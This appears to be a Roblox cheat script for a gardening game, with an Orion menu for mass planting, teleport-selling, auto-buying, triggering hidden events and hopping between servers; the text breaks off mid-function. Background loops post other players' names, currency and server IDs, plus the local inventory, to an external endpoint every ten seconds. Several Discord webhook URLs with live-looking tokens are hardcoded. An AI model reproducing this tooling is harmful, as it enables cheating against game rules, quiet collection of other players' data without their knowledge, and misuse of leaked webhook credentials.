local PlantingTab = Window:MakeTab({
    Name = "Planting",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local PlantingSection = PlantingTab:AddSection({
    Name = "Planting Actions"
})

local plantCount = 5 -- Default value
local delayBetweenPlants = 0.01
local selectedSeed = "Strawberry"
local seedOptions = {
    "Apple",
    "Bamboo",
    "Banana",
    "Beanstalk",
    "Blood Banana",
    "Blueberry",
    "Cacao",
    "Candy Blossom",
    "Candy Sunflower",
    "Carrot", -- Added
    "Celestiberry", -- Added
    "Cherry Blossom",
    "Chocolate Carrot",
    "Cactus",
    "Coconut",
    "Corn",
    "Cranberry",
    "Cursed Fruit",
    "Daffodil",
    "Dragon Fruit",
    "Durian",
    "Easter Egg",
    "Eggplant",
    "Glowshroom",
    "Grape",
    "Lemon",
    "Lotus",
    "Mango",
    "Mint",
    "Moon Blossom",
    "Moon Mango", -- Added
    "Moon Melon",
    "Moonflower",
    "Mushroom",
    "Nightshade",
    "Orange Tulip",
    "Papaya",
    "Passionfruit",
    "Pear",
    "Peach",
    "Pepper",
    "Pineapple",
    "Raspberry",
    "Red Lollipop",
    "Soul Fruit",
    "Starfruit",
    "Strawberry",
    "Tomato",
    "Venus Fly Trap",
    "Watermelon",
}
PlantingSection:AddTextbox({
    Name = "Number of Plants",
    Default = tostring(plantCount),
    TextDisappear = false,
    Callback = function(Value)
        plantCount = tonumber(Value) or 1
    end
})

PlantingSection:AddDropdown({
    Name = "Select Seed",
    Default = selectedSeed,
    Options = seedOptions,
    Callback = function(Value)
        selectedSeed = Value
    end
})

PlantingSection:AddButton({
    Name = "Plant Selected Seed",
    Callback = function()
        local player = game.Players.LocalPlayer

        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local rootPart = player.Character.HumanoidRootPart
            local plantPosition = rootPart.Position - Vector3.new(0, 2, 0)

            for i = 1, plantCount do
                local args = {
                    [1] = plantPosition,
                    [2] = selectedSeed
                }
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(unpack(args))
                task.wait(delayBetweenPlants)
            end

            OrionLib:MakeNotification({
                Name = "Planting Complete",
                Content = "Planted " .. tostring(plantCount) .. " " .. selectedSeed .. "!",
                Time = 5
            })

        else
            warn("Player character or HumanoidRootPart not found.")
        end
    end
})
PlantingSection:AddButton({ 
    Name = "Remove Plants except the Fruits",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local Workspace = game:GetService("Workspace")
        local farmContainer = Workspace:FindFirstChild("Farm")

        if not farmContainer then
            warn("Farm container not found.")
            return
        end

        local removedCount = 0
        local nonMultiHarvestPlants = {
    	"Bamboo",
    	"Candy Sunflower",
    	"Carrot",
    	"Chocolate Carrot",
    	"Daffodil",
    	"Mushroom",
    	"Orange Tulip",
    	"Pumpkin",
    	"Red Lollipop",
    	"Watermelon",
		}
        for _, farmFolder in pairs(farmContainer:GetChildren()) do
            if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
                local important = farmFolder:FindFirstChild("Important")
                if important then
                    local data = important:FindFirstChild("Data")
                    if data and data:IsA("Folder") then
                        local owner = data:FindFirstChild("Owner")
                        if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                            local plants = important:FindFirstChild("Plants_Physical")
                            if plants then
                                for _, plant in pairs(plants:GetChildren()) do
                                    if not table.find(nonMultiHarvestPlants, plant.Name) then
                                        for _, item in pairs(plant:GetChildren()) do
                                            if item.Name ~= "Fruits" then
                                                item:Destroy()
                                                removedCount += 1
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        print("Removed " .. removedCount .. " parts from multi-harvest plants (excluding Fruits).")
    end
})


-- Sell Inventory Keybind in Main Section
SectionMain:AddBind({
    Name = "Sell Inventory",
    Default = Enum.KeyCode.Z,
    Hold = false,
    Callback = function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local workspace = game:GetService("Workspace")
        local localPlayer = Players.LocalPlayer
        local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local steven = workspace:WaitForChild("NPCS"):WaitForChild("Steven")
        local stevenHRP = steven:FindFirstChild("HumanoidRootPart")
        if not stevenHRP then
            warn("Steven has no HumanoidRootPart")
            return
        end
        local originalCFrame = rootPart.CFrame
        local offset = stevenHRP.CFrame.LookVector * 3
        rootPart.CFrame = stevenHRP.CFrame + offset
        task.wait(0.5)
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer()
        task.wait(0.000000000000000002)
        rootPart.CFrame = originalCFrame
    end
})
local HttpService = game:GetService("HttpService")
local webhookUrls = {
    Rain = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Frost = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Thunderstorm = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Luck = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE"
}
local lastSentTime = {}
local function sendDiscordWebhook(webhookUrl, content, title, description)
    local data = {
        content = content,
        embeds = {}
    }
    if title and description then
        data.embeds = {
            {
                title = title,
                description = description,
                color = 65280
            }
        }
    end
    local jsonData = HttpService:JSONEncode(data)
    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function checkWeatherAndSend()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local BottomList = LocalPlayer.PlayerGui:FindFirstChild("Bottom_UI") and LocalPlayer.PlayerGui.Bottom_UI.BottomFrame.Holder.List
    if not BottomList then return end

    local weatherTypes = {"Luck", "Rain", "Frost", "Thunderstorm"}
    local detected = {}
    local currentTime = os.time()
	local jobId = game.JobId
    for _, weather in ipairs(weatherTypes) do
        local frame = BottomList:FindFirstChild(weather)
        if frame and frame.Visible then
            table.insert(detected, weather)
        end
    end
	
    -- Only send the notification if weather is detected and hasn't been sent recently
    if #detected > 0 then
        local jobId = game.JobId
        local playerCount = #game.Players:GetPlayers()
        local cooldown = 240 -- 4 minutes in seconds

        for _, weather in ipairs(detected) do
            local durationText = ""
            if weather == "Thunderstorm" then
                durationText = " (Lasts ~5 minutes)"
            elseif weather == "Rain" then
                durationText = " (Lasts ~5 minutes)"
            elseif weather == "Frost" then
                durationText = " (Duration unknown)"
            elseif weather == "Luck" then
                durationText = " (Duration unknown)"
            end

            if not lastSentTime[weather] or currentTime - lastSentTime[weather] >= cooldown then
                local webhookToSend = webhookUrls[weather]
                -- Fallback to the default webhook if a specific one isn't found
                if not webhookToSend then
                    webhookToSend = webhookUrls.Luck
                end

                -- Send the Job ID first
                sendDiscordWebhook(webhookToSend, "" .. jobId, nil, nil) -- Send Job ID without title/description -- Add a short delay (1 second)

                -- Then send the weather notification
                sendDiscordWebhook(
                    webhookToSend,
                    nil, -- No content for the weather message.
                    "🌦️ Weather Detected: " .. weather,
                    "Player: **Go now**\n" ..
                        "Weather: **" .. weather .. "**" .. durationText .. "\n" ..
                        "Players: **" .. playerCount .. "**"
                )
                lastSentTime[weather] = currentTime -- Update the last sent time for this weather
            end
        end
    end
end

spawn(function()
    while true do
		
        checkWeatherAndSend()
        task.wait(10) -- Check every 10 seconds
    end
end)
--sheckles
local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local ENDPOINT_URL  = "https://your-repl-name.repl.co/roblox"  -- replace
local SEND_INTERVAL = 10

local function getPlayerData(player)
    local shekels = 0
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local v = leaderstats:FindFirstChild("Sheckles")
               or leaderstats:FindFirstChild("Money")
               or leaderstats:FindFirstChild("Cash")
        if v and typeof(v.Value) == "number" then
            shekels = v.Value
        end
    end

    local inventory = {}
    if player == LocalPlayer then
        local backpack = player:WaitForChild("Backpack")
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(inventory, tool.Name)
            end
        end
    end

    return shekels, inventory
end

local function isPrivateServer()
    local ok, res = pcall(function()
        return game.PrivateServerId ~= "" and game.PrivateServerOwnerId > 0
    end)
    return ok and res
end

local function sendServerData()
    if not LocalPlayer or not LocalPlayer.Parent then return end
    if not HttpService.HttpEnabled then return end

    local allPlayers = Players:GetPlayers()
    if #allPlayers == 0 then
        local payload = {
            player        = "EmptyServer",
            shekels       = 0,
            playerCount   = 0,
            privateServer = isPrivateServer(),
            jobId         = tostring(game.JobId),
            placeId       = (game.PlaceId and game.PlaceId > 0) and tostring(game.PlaceId) or "universal",
            inventory     = {}
        }
        local data = HttpService:JSONEncode(payload)
        pcall(function()
            HttpService:RequestAsync({ Url=ENDPOINT_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=data })
        end)
        return
    end

    for _, player in ipairs(allPlayers) do
        local shekels, inventory = getPlayerData(player)
        local payload = {
            player        = player.Name,
            shekels       = shekels,
            playerCount   = #allPlayers,
            privateServer = isPrivateServer(),
            jobId         = tostring(game.JobId),
            placeId       = (game.PlaceId and game.PlaceId > 0) and tostring(game.PlaceId) or "universal",
            inventory     = inventory
        }
        local data = HttpService:JSONEncode(payload)
        pcall(function()
            HttpService:RequestAsync({ Url=ENDPOINT_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=data })
        end)
        task.wait(0.1)
    end
end

spawn(function()
    while true do
        sendServerData()
        task.wait(SEND_INTERVAL)
    end
end)
local HiddenFeatures = Window:MakeTab({
    Name = "Hidden Features",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

HiddenFeatures:AddButton({
    Name = "Trigger Tornado Event",
    Callback = function()
        workspace:SetAttribute("TornadoEvent", true)
    end
})

HiddenFeatures:AddButton({
    Name = "Trigger Jandel Laser",
    Callback = function()
        workspace:SetAttribute("JandelLazer", true)
    end
})

HiddenFeatures:AddButton({
    Name = "Trigger Monster Mash",
    Callback = function()
        workspace:SetAttribute("MonsterMash", true)
    end
})
HiddenFeatures:AddButton({
    Name = "Stop All Events",
    Callback = function()
        workspace:SetAttribute("TornadoEvent", false)
        workspace:SetAttribute("JandelLazer", false)
        workspace:SetAttribute("MonsterMash", false)
    end
})

--Guis
local Guis = Window:MakeTab({
    Name = "Game GUIs",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local gamegui = Guis:AddSection({
    Name = "Guis for the Game"
})
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to toggle the Enabled property of a GuiObject
local function toggleEnabled(guiObject)
    if guiObject then
        guiObject.Enabled = not guiObject.Enabled
    end
end

-- Function to toggle the Visible property of a GuiObject
local function toggleVisible(guiObject)
    if guiObject then
        guiObject.Visible = not guiObject.Visible
    end
end
gamegui:AddButton({
    Name = "Twilight Shop",
    Callback = function()
        local Nightevent = playerGui:WaitForChild("NightEventShop_UI")
        toggleEnabled(Nightevent)
    end
})
gamegui:AddButton({
    Name = "Cosmetic Shop",
    Callback = function()
        local Cosmetic = playerGui:WaitForChild("CosmeticShop_UI")
        toggleEnabled(Cosmetic)
    end
})
gamegui:AddButton({
    Name = "Bloodmoon Shop",
    Callback = function()
        local bloodShop = playerGui:WaitForChild("EventShop_UI")
        toggleEnabled(bloodShop)
    end
})

gamegui:AddButton({
    Name = "Seed Shop",
    Callback = function()
        local seedShop = playerGui:WaitForChild("Seed_Shop")
        toggleEnabled(seedShop)
    end
})

gamegui:AddButton({
    Name = "Gear Shop",
    Callback = function()
        local gearShop = playerGui:WaitForChild("Gear_Shop")
        toggleEnabled(gearShop)
    end
})

gamegui:AddButton({
    Name = "Easter Shop -- cooked doesnt work",
    Callback = function()
        local easterShop = playerGui:WaitForChild("Easter_Shop")
        toggleEnabled(easterShop)
    end
})
gamegui:AddButton({
    Name = "Gear Teleport",
    Callback = function()
        local gearTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Gear")
        toggleVisible(gearTeleportUI)
    end
})
gamegui:AddButton({
    Name = "Pet Teleport",
    Callback = function()
        local petsTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Pets")
        toggleVisible(petsTeleportUI)
    end
})


gamegui:AddButton({
    Name = "Daily Quests",
    Callback = function()
        local dailyQuestsUI = playerGui:WaitForChild("DailyQuests_UI")
        toggleEnabled(dailyQuestsUI)
    end
})

gamegui:AddButton({
    Name = "Starter Pack",
    Callback = function()
        local starterPack = playerGui:WaitForChild("Hud_UI"):WaitForChild("SideBtns"):WaitForChild("StarterPack")
        toggleVisible(starterPack)
    end
})
-- Auto Buy for mobile
local AutoBuyConfig = Window:MakeTab({
    Name = "Auto Buy",
    Icon = "rbxassetid://4483345998", -- Replace with an appropriate weather icon ID
    PremiumOnly = false
})

local SectionGears = AutoBuyConfig:AddSection({
    Name = "Auto Buy Gears"
})

local AutobuygearsEnabled = {} -- Table to track if auto-buy is enabled for each gear

local function AutoBuyGear(Value, GearName)
    AutobuygearsEnabled[GearName] = Value
    if Value then
        while AutobuygearsEnabled[GearName] do
            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyGearStock"):FireServer(GearName)
            end)
            if not success then
                warn("Error buying gear:", errorMessage)
            end
            task.wait(0.5)
            if not AutobuygearsEnabled[GearName] then
                break -- Stop if the toggle is turned off
            end
        end
    end
end

AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Watering Can]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Watering Can")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Trowel]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Trowel")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Lightning Rod]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Lightning Rod")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Basic Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Basic Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Advanced Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Advanced Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Godly Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Godly Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Master Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Master Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Chocolate Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Chocolate Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Cleaning Spray]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Cleaning Spray")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Harvest Tool]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Harvest Tool")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Friendship Pot]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Friendship Pot")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Recall Wrench]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Recall Wrench")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Harvest Tool]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Harvest Tool")
    end
})

local SectionSeeds = AutoBuyConfig:AddSection({
    Name = "Auto Buy Seeds"
})

local AutobuyseedsEnabled = {} -- Table to track if auto-buy is enabled for each seed

local function AutoBuySeed(Value, SeedName)
    AutobuyseedsEnabled[SeedName] = Value
    if Value then
        while AutobuyseedsEnabled[SeedName] do
            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(SeedName)
            end)
            if not success then
                warn("Error buying seed:", errorMessage)
            end
            task.wait(0.5)
            if not AutobuyseedsEnabled[SeedName] then
                break -- Stop if the toggle is turned off
            end
        end
    end
end

AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Carrot]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Carrot")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Strawberry]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Strawberry")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Blueberry]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Blueberry")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Orange Tulip]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Orange Tulip")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Tomato]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Tomato")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Corn]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Corn")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Daffodil]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Daffodil")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Watermelon]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Watermelon")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Pumpkin]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Pumpkin")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Apple]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Apple")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Bamboo]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Bamboo")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Coconut]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Coconut")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Cactus]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Cactus")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Dragon Fruit]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Dragon Fruit")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Mango]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Mango")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Grape]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Grape")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Mushroom]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Mushroom")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Pepper]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Pepper")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Beanstalk]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Beanstalk")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Sugar Apple]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Sugar Apple")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Ember Lily]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Ember Lily")
    end
})
-- Weather Finder Tab
local WeatherTab = Window:MakeTab({
    Name = "Blood Moon Finder",
    Icon = "rbxassetid://4483345998", -- Replace with an appropriate weather icon ID
    PremiumOnly = false
})

local SectionWeather = WeatherTab:AddSection({
    Name = "Job ID Teleport"
})

local JobIdTextBoxValue = "" -- Store the textbox value here
local placeId = game.PlaceId -- Get the current place ID

SectionWeather:AddTextbox({
    Name = "Job ID:",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        JobIdTextBoxValue = Value -- Update the stored value
    end
})

SectionWeather:AddButton({
    Name = "Teleport to Job ID",
    Callback = function()
        local jobId = JobIdTextBoxValue -- Retrieve the stored value
        if jobId ~= "" then
            local success, errorMessage = pcall(function()
                game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
            end)
            if not success then
                OrionLib:MakeNotification({
                    Name = "Teleport Failed",
                    Content = "Error teleporting: " .. errorMessage,
                    Time = 5
                })
            end
        else
            OrionLib:MakeNotification({
                Name = "Enter Job ID",
                Content = "Please enter a Job ID to teleport.",
                Time = 3
            })
        end
    end
})


local SectionDiscord = WeatherTab:AddSection({
    Name = "Discord Link -- you can join servers with job id here"
})

SectionDiscord:AddButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/kjmuSdNaTn") -- Replace with your actual Discord server link
        OrionLib:MakeNotification({
            Name = "Discord Link Copied",
            Content = "Discord server link copied to clipboard!",
            Time = 3
        })
    end
})

-- Combined Roblox Egg, Gear, and Seed Stock Discord Notifier
-- File: ServerScriptService/StockNotifier.lua

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Webhook URLs (Keep these private!)
local webhookUrls = {
    EggStock = "https://discord.com/api/webhooks/1370839994238767134/xTStdA4yTrsJABFBDq-XTbOXrl7R8iggtdg8icn3-DIt5ElG_M_HsJlgNHr7Jk4-zskM",
    GearStock = "https://discord.com/api/webhooks/1370839848096760021/uLlI1nKK-zdANztyD67cqUslEtzceicKaTQ-op2NIEpuQsfCXzDDGr5vWbZoR4ttV7VR",
    SeedStock = "https://discord.com/api/webhooks/1370839500120653845/96N_iTqmYJq2MayySlYBcUZf_MMaPIlCuhu92Jwb8sVYQlI1ss31HsX3g3Alcijri_ZF"
}

-- Role mention IDs for Discord
local roleMentions = {
    Egg = {
        ["Legendary"] = "<@&1366694358144913459>",
		["Bug"] 	  = "<@&1370939662956236800>"
-- Using Legendary role ID as requested
-- Add more egg roles as needed
    },
    Gear = {
        ["Legendary"] = "<@&1366694358144913459>",
        ["Mythical"]    = "<@&1366694415741227099>",
        ["Divine"]      = "<1366694519483142165>" -- Using Legendary role ID as requested
        -- Add more gear roles as needed
    },
    Seed = {
        ["Legendary"] = "<@&1366694358144913459>",
        ["Mythical"]    = "<@&1366694415741227099>",
        ["Divine"]      = "<@&1366694519483142165>"
    }
}

local lastSentStocks = {
    Egg = { stockString = "", time = 0 },
    Gear = { stockString = "", time = 0 },
    Seed = { stockString = "", time = 0 }
}
local serverCooldown = 300 -- 5 minutes

local rarityEmojis = {
    Egg = {
        ["Common"]    = "🥚",    -- Changed to egg emoji for consistency
        ["Uncommon"]  = "🍀",    -- Changed to four-leaf clover for luck/rareness
        ["Rare"]      = "💎",    -- Changed to diamond emoji for rarity
        ["Legendary"] = "🔥",    -- Changed to fire emoji for extraordinary value
        ["Bug"]       = "🐛"     -- No change needed, stays as bug emoji
    },
    Gear = {
        ["Divine"]     = "💖",
        ["Mythical"]  = "💗",
        ["Legendary"] = "🟠",
        ["Rare"]      = "🕢",
        ["Uncommon"]  = "🕘",
        ["Common"]    = "🕧",
        ["Limited Mythic"] = "✨" -- Example for a special rarity
    },
    Seed = {
        ["Divine"] = "💖",
        ["Mythical"] = "💗",
        ["Exclusive"] = "💝",
        ["Legendary"] = "🟠",
        ["Rare"] = "🕢",
        ["Uncommon"] = "🕘",
        ["Common"] = "🕧",
    }
}

local rarityOrder = {
    Egg = { "Legendary", "Rare", "Uncommon", "Common", "Bug" },
    Gear = { "Divine", "Mythical", "Limited Mythic", "Legendary", "Rare", "Uncommon", "Common" },
    Seed = { "Divine", "Mythical", "Exclusive", "Legendary", "Rare", "Uncommon", "Common" }
}

local itemDetails = {
    Egg = {
        ["Common Egg"]    = { cost = "50,000C", chance = "99% of shop", rarity = "Common" },
        ["Uncommon Egg"]  = { cost = "150,000C", chance = "53% of shop", rarity = "Uncommon" },
        ["Rare Egg"]      = { cost = "600,000C", chance = "21% of shop", rarity = "Rare" },
        ["Legendary Egg"] = { cost = "3,000,000C", chance = "9% of Shop", rarity = "Legendary" },
        ["Bug Egg"]       = { cost = "300R or 50,000,000C", chance = "3% of Shop", rarity = "Bug" }
    },
    Gear = {
        ["Watering Can"] = "Common",
        ["Trowel"] = "Uncommon",
        ["Basic Sprinkler"] = "Rare",
        ["Advanced Sprinkler"] = "Legendary",
        ["Godly Sprinkler"] = "Mythical",
        ["Lightning Rod"] = "Mythical",
        ["Master Sprinkler"] = "Divine",
        ["Chocolate Sprinkler"] = "Limited Mythic" -- Example for a limited item
    },
    Seed = {
        ["Carrot"] = "Common", ["Strawberry"] = "Common",
        ["Blueberry"] = "Uncommon", ["Orange Tulip"] = "Uncommon",
        ["Tomato"] = "Rare", ["Corn"] = "Rare", ["Daffodil"] = "Rare",
        ["Watermelon"] = "Legendary", ["Pumpkin"] = "Legendary", ["Apple"] = "Legendary", ["Bamboo"] = "Legendary",
        ["Coconut"] = "Mythical", ["Cactus"] = "Mythical", ["Dragon Fruit"] = "Mythical", ["Mango"] = "Mythical",
        ["Grape"] = "Divine", ["Mushroom"] = "Divine", ["Pepper"] = "Divine"
    }
}

local function sendDiscordWebhookEgg(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getEggStockInfo()
    local petStand = workspace.NPCS["Pet Stand"]
    if not petStand or not petStand.EggLocations then warn("Pet Stand or EggLocations not found.") return {} end

    local availableEggs = {}
    for _, item in pairs(petStand.EggLocations:GetChildren()) do
        if item:IsA("Model") and itemDetails.Egg[item.Name] then
            table.insert(availableEggs, item.Name)
        end
    end
    return availableEggs
end

local function checkAndSendEggStockNotification()
    local availableEggs = getEggStockInfo()
    local currentTime = os.time()
    local inStockMessages = {}
    local mentions = {}
    local mentionedRarities = {}
    local hasInStockEggs = false

    local eggCounts = {}
    for _, eggName in ipairs(availableEggs) do
        eggCounts[eggName] = (eggCounts[eggName] or 0) + 1
    end

    for eggName, count in pairs(eggCounts) do
        local details = itemDetails.Egg[eggName]
        if details then
            hasInStockEggs = true
            for i = 1, count do
                table.insert(inStockMessages, (rarityEmojis.Egg[details.rarity] or "🥚") .. " " .. eggName .. " (" .. details.cost .. ")")
            end
            if roleMentions.Egg[details.rarity] and not mentionedRarities[details.rarity] and count > 0 then
                mentionedRarities[details.rarity] = true
                table.insert(mentions, roleMentions.Egg[details.rarity])
            end
        end
    end

    local inStockMessagesString = table.concat(inStockMessages, "\n")
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    if hasInStockEggs and inStockMessagesString ~= lastSentStocks.Egg.stockString and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, mentionContent, "🥚 New Eggs in Stock!", "The following eggs are now in stock:\n\n" .. inStockMessagesString)
        lastSentStocks.Egg.stockString = inStockMessagesString
        lastSentStocks.Egg.time = currentTime
    elseif not hasInStockEggs and lastSentStocks.Egg.stockString ~= "No eggs currently in stock." and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, nil, "🥚 Egg Stock Update", "No eggs are currently in stock.")
        lastSentStocks.Egg.stockString = "No eggs currently in stock."
        lastSentStocks.Egg.time = currentTime
    elseif hasInStockEggs and lastSentStocks.Egg.stockString == "No eggs currently in stock." and (not lastSentStocks.Egg.time or currentTime - lastSentStocks.Egg.time >= serverCooldown) then
        sendDiscordWebhookEgg(webhookUrls.EggStock, mentionContent, "🥚 Egg Restock!", "Eggs have been restocked:\n\n" .. inStockMessagesString)
        lastSentStocks.Egg.stockString = inStockMessagesString
        lastSentStocks.Egg.time = currentTime
    end
end

local function sendDiscordWebhookGear(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
